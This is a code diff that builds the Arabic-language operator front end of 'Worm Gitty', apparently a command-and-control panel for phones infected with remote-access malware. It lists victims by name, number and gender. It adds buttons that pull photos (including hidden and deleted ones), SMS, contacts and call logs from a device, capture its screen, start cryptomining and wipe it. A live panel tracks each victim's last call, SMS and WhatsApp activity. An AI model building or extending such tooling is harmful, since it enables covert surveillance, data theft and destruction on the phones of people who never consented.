@@ -11,6 +11,7 @@
   <div class="topbar">
     <span class="brand">Worm Gitty</span>
     <nav x-show="$store.panel.user" class="nav">
+      <button data-testid="nav-home" @click="$store.panel.show('#/home')">الرئيسية</button>
       <button data-testid="nav-android" @click="$store.panel.show('#/devices?platform=android')">أندرويد</button>
       <button data-testid="nav-windows" @click="$store.panel.show('#/devices?platform=windows')">ويندوز</button>
       <button data-testid="nav-all" @click="$store.panel.show('#/devices')">الكل</button>
@@ -20,54 +21,92 @@
 
   <!-- LOGIN -->
   <main id="screen-login" x-show="$store.panel.route.name === 'login'">
-    <form class="card login-card" data-testid="login-form" @submit.prevent="$store.panel.startLogin(email, password)">
+    <form class="card login-card" data-testid="login-form" @submit.prevent="$store.panel.pendingTicket ? $store.panel.submit2fa(code) : $store.panel.startLogin(username, password)">
       <h1>دخول المشغّل</h1>
-      <input data-testid="email" name="email" type="email" placeholder="البريد" x-model="email" required />
-      <input data-testid="password" name="password" type="password" placeholder="كلمة المرور" x-model="password" required />
+      <template x-if="!$store.panel.pendingTicket">
+        <div class="login-fields">
+          <input data-testid="email" name="username" type="text" placeholder="اسم المستخدم" x-model="username" required />
+          <input data-testid="password" name="password" type="password" placeholder="كلمة المرور" x-model="password" required />
+        </div>
+      </template>
+      <template x-if="$store.panel.pendingTicket">
+        <input data-testid="twofa" name="twofa" type="text" inputmode="numeric" maxlength="8"
+               placeholder="رمز التحقق" x-model="code" required />
+      </template>
       <button data-testid="login-submit" type="submit">ادخل</button>
       <p data-testid="login-error" class="error" x-show="$store.panel.loginError" x-text="$store.panel.loginError"></p>
     </form>
   </main>
 
-  <!-- DEVICES LIST -->
-  <main id="screen-devices" x-show="$store.panel.route.name === 'devices'" x-init="">
-    <section class="state-block" data-testid="devices-loading" x-show="$store.panel.view === 'loading'">تحميل…</section>
+  <!-- HOME: platform cards -->
+  <main id="screen-home" x-show="$store.panel.route.name === 'home'">
+    <div class="cards-home">
+      <button class="card home-card" data-testid="card-phones" @click="$store.panel.show('#/devices')">
+        <span class="home-icon">📱</span>
+        <span class="home-title">الهواتف</span>
+      </button>
+      <button class="card home-card home-disabled" data-testid="card-pc" disabled>
+        <span class="home-icon">💻</span>
+        <span class="home-title">PC &amp; Laptops</span>
+        <span class="home-badge">v2</span>
+      </button>
+    </div>
+  </main>
 
+  <!-- DEVICES LIST -->
+  <main id="screen-devices" x-show="$store.panel.route.name === 'devices'">
+    <section class="state-block" data-testid="devices-loading" x-show="$store.panel.view === 'loading'">تحميل…</section>
     <section class="state-block" data-testid="devices-empty" x-show="$store.panel.view === 'empty'">
       مفيش أجهزة على المنصة دي.
     </section>
-
     <section class="state-block" data-testid="devices-offline" x-show="$store.panel.view === 'offline'">
       <span x-text="$store.panel.message"></span>
     </section>
-
     <section class="state-block" data-testid="devices-cooldown" x-show="$store.panel.view === 'cooldown'">
       <span x-text="$store.panel.message"></span>
       (<span data-testid="cooldown-seconds" x-text="$store.panel.cooldownLeft"></span> ثانية)
     </section>
-
     <section class="state-block" data-testid="devices-server-error" x-show="$store.panel.view === 'server-error'">
       <span x-text="$store.panel.message"></span>
       <button data-testid="devices-retry" @click="$store.panel.reload()">إعادة المحاولة</button>
     </section>
 
-    <table data-testid="devices-table" x-show="$store.panel.view === 'ready'" class="card">
-      <thead>
-        <tr><th>الاسم</th><th>الموبايل</th><th>الموديل</th><th>Sdk</th><th>الحالة</th><th>آخر ظهور</th></tr>
-      </thead>
-      <tbody>
-        <template x-for="d in $store.panel.devices" :key="d.id">
-          <tr :data-testid="'device-row-' + d.id" @click="$store.panel.show('#/devices/' + d.id)">
-            <td x-text="d.name"></td>
-            <td x-text="$store.panel.formatE164(d.phone)"></td>
-            <td x-text="d.model"></td>
-            <td x-text="d.sdk"></td>
-            <td><span :class="$store.panel.badgeOf(d.state).className" x-text="$store.panel.badgeOf(d.state).label"></span></td>
-            <td x-text="new Date(d.lastSeen).toLocaleString('ar-EG')"></td>
-          </tr>
-        </template>
-      </tbody>
-    </table>
+    <div x-show="$store.panel.view === 'ready'" class="devices-wrap">
+      <div class="toolbar">
+        <div class="chips">
+          <template x-for="f in [['','الكل'],['online','متصل'],['offline','غير متصل'],['deleted','محذوف']]" :key="f[0]">
+            <button class="chip" :class="{on: $store.panel.statusFilter === f[0]}"
+                    :data-testid="'filter-' + (f[0] || 'all')"
+                    @click="$store.panel.statusFilter = f[0]" x-text="f[1]"></button>
+          </template>
+        </div>
+        <select data-testid="gender-filter" x-model="$store.panel.genderFilter" class="chip-select">
+          <option value="">النوع: الكل</option>
+          <option value="male">ذكر</option>
+          <option value="female">أنثى</option>
+        </select>
+        <input data-testid="device-search" class="search" type="search" placeholder="بحث بالاسم أو الرقم"
+               @input.debounce.300ms="$store.panel.search = $event.target.value" />
+      </div>
+
+      <table data-testid="devices-table" class="card">
+        <thead>
+          <tr><th></th><th>الاسم</th><th>الموبايل</th><th>النوع</th><th>الحالة</th><th>معانا منذ</th></tr>
+        </thead>
+        <tbody>
+          <template x-for="d in $store.panel.filteredDevices()" :key="d.id">
+            <tr :data-testid="'device-row-' + d.id" @click="$store.panel.show('#/devices/' + d.id)">
+              <td><span class="dot" :class="$store.panel.dotClass(d)"></span></td>
+              <td x-text="d.name"></td>
+              <td x-text="$store.panel.formatE164(d.phone)"></td>
+              <td x-text="$store.panel.genderIcon(d)"></td>
+              <td x-text="$store.panel.stateLabel(d)"></td>
+              <td x-text="$store.panel.daysWithUs(d) + ' يوم'"></td>
+            </tr>
+          </template>
+        </tbody>
+      </table>
+    </div>
   </main>
 
   <!-- DEVICE DETAIL -->
@@ -81,27 +120,87 @@
       <button data-testid="device-retry" @click="$store.panel.reload()">إعادة المحاولة</button>
     </section>
 
-    <article class="card" data-testid="device-card" x-show="$store.panel.view === 'ready'">
-      <h2 data-testid="detail-name" x-text="$store.panel.detail?.name"></h2>
-      <p>
-        <span data-testid="detail-phone" x-text="$store.panel.formatE164($store.panel.detail?.phone)"></span>
-        — <span data-testid="detail-model" x-text="$store.panel.detail?.model"></span>
-        — <span data-testid="detail-state" :class="$store.panel.badgeOf($store.panel.detail?.state).className"
-              x-text="$store.panel.badgeOf($store.panel.detail?.state).label"></span>
-      </p>
-      <div class="actions">
-        <button data-testid="detail-reconnect" @click="$store.panel.reconnect($store.panel.route.id)">إعادة ربط</button>
-        <button data-testid="detail-delete" class="danger" @click="$store.panel.removeDevice($store.panel.route.id)">حذف</button>
+    <div class="detail-wrap" x-show="$store.panel.view === 'ready'">
+      <article class="card" data-testid="device-card">
+        <h2 data-testid="detail-name" x-text="$store.panel.detail?.name"></h2>
+        <p>
+          <span data-testid="detail-phone" x-text="$store.panel.formatE164($store.panel.detail?.phone)"></span>
+          — <span data-testid="detail-model" x-text="$store.panel.detail?.model"></span>
+          — <span data-testid="detail-state" :class="$store.panel.badgeOf($store.panel.detail?.state).className"
+                x-text="$store.panel.badgeOf($store.panel.detail?.state).label"></span>
+          — <span data-testid="detail-downloads" x-text="'اتنزّل: ' + ($store.panel.detail?.downloadCount ?? 0)"></span>
+        </p>
+        <div class="actions">
+          <button data-testid="detail-reconnect" @click="$store.panel.reconnect($store.panel.route.id)">إعادة ربط</button>
+          <button data-testid="detail-delete" class="danger" @click="$store.panel.removeDevice($store.panel.route.id)">حذف</button>
+        </div>
+
+        <!-- The five ordered operator actions -->
+        <div class="actions-col">
+          <button data-testid="cmd-mine" @click="$store.panel.sendCommand($store.panel.route.id, 'mine')">
+            ⛏️ التعدين <span class="hint">(غير مدعوم)</span>
+          </button>
+          <button data-testid="cmd-photos" @click="$store.panel.openPullModal($store.panel.route.id)">
+            📥 سحب الصور
+          </button>
+          <div class="actions">
+            <span class="hint">إضافي:</span>
+            <button data-testid="cmd-sms" @click="$store.panel.sendCommand($store.panel.route.id, 'sms')">SMS</button>
+            <button data-testid="cmd-contacts" @click="$store.panel.sendCommand($store.panel.route.id, 'contacts')">جهات الاتصال</button>
+            <button data-testid="cmd-calllog" @click="$store.panel.sendCommand($store.panel.route.id, 'call_log')">سجل المكالمات</button>
+          </div>
+          <button data-testid="cmd-screen" @click="$store.panel.sendCommand($store.panel.route.id, 'screen_capture', {frames:6, intervalSec:10})">
+            🖥️ التحكم بالشاشة
+          </button>
+          <button data-testid="cmd-wipe" class="danger"
+                  :data-confirm="$store.panel.wipeArmed ? '1' : ''"
+                  @click="$store.panel.formatWipe($store.panel.route.id)"
+                  x-text="$store.panel.wipeArmed ? 'متأكد؟ اضغط تاني للفرمتة' : '⚠️ فرمتة'"></button>
+          <button data-testid="cmd-ping" @click="$store.panel.sendCommand($store.panel.route.id, 'ping')">ping</button>
+          <span data-testid="command-flash" x-show="$store.panel.flash" x-text="$store.panel.flash"></span>
+        </div>
+      </article>
+
+      <!-- Six-stat live side panel -->
+      <aside class="card stats-panel" data-testid="stats-panel" x-show="$store.panel.detail">
+        <h3>حالة الجهاز</h3>
+        <p>🔋 <span x-text="$store.panel.statOf('batteryPct')"></span>% <span x-show="$store.panel.statOf('charging')">⚡شحن</span></p>
+        <p>🌡️ بطارية <span x-text="$store.panel.statOf('battTempC')"></span>° — CPU <span x-text="$store.panel.statOf('cpuTempC') ?? 'غير متاح'"></span></p>
+        <p>📶 <span x-text="$store.panel.statOf('netType')"></span></p>
+        <p>📞 <span x-text="$store.panel.statText('lastCall')"></span></p>
+        <p>✉️ <span x-text="$store.panel.statText('lastSms')"></span></p>
+        <p>🟢 واتساب: <span x-text="$store.panel.statText('lastWa')"></span></p>
+      </aside>
+    </div>
+
+    <!-- Pull Photos modal -->
+    <div class="modal-back" data-testid="pull-modal" x-show="$store.panel.pullModal.open" @click.self="$store.panel.pullModal.open = false">
+      <div class="card modal">
+        <h3>سحب الصور</h3>
+        <input class="search" type="search" data-testid="pull-search" placeholder="بحث بالاسم"
+               @input.debounce.300ms="$store.panel.pullModal.search = $event.target.value" />
+        <div class="chips">
+          <template x-for="t in ['original','hidden','deleted']" :key="t">
+            <button class="chip" :class="{on: $store.panel.pullModal.tab === t}"
+                    :data-testid="'pull-tab-' + t"
+                    @click="$store.panel.pullModal.tab = t"
+                    x-text="t + ' (' + ($store.panel.pullModal.counts[t] ?? 0) + ')'"></button>
+          </template>
+        </div>
+        <ul class="pull-list">
+          <template x-for="p in $store.panel.pullItems()" :key="p.hash">
+            <li x-text="p.name"></li>
+          </template>
+        </ul>
+        <input class="spec" data-testid="pull-spec" placeholder="N | DEL N | HIDE N"
+               x-model="$store.panel.pullModal.spec" />
+        <p class="hint">اختصارات: N = أصلي · DEL N = محذوف · HIDE N = مخفي</p>
+        <button data-testid="pull-start" @click="$store.panel.startPull($store.panel.route.id)">ابدأ</button>
+        <div class="progress" x-show="$store.panel.pullModal.progress !== null">
+          <div class="bar" :style="'width:' + ($store.panel.pullModal.progress ?? 0) + '%'"></div>
+        </div>
       </div>
-      <div class="actions">
-        <button data-testid="cmd-ping" @click="$store.panel.sendCommand($store.panel.route.id, 'ping')">ping</button>
-        <button data-testid="cmd-screen" @click="$store.panel.sendCommand($store.panel.route.id, 'screen_capture')">بث الشاشة</button>
-        <button data-testid="cmd-camera" @click="$store.panel.sendCommand($store.panel.route.id, 'camera')">كاميرا</button>
-        <button data-testid="cmd-photos" @click="$store.panel.sendCommand($store.panel.route.id, 'pull_photos')">سحب صور</button>
-        <button data-testid="cmd-wipe" class="danger" @click="$store.panel.sendCommand($store.panel.route.id, 'wipe')">فرمتة</button>
-        <span data-testid="command-flash" x-show="$store.panel.flash" x-text="$store.panel.flash"></span>
-      </div>
-    </article>
+    </div>
   </main>
 </body>
 </html>
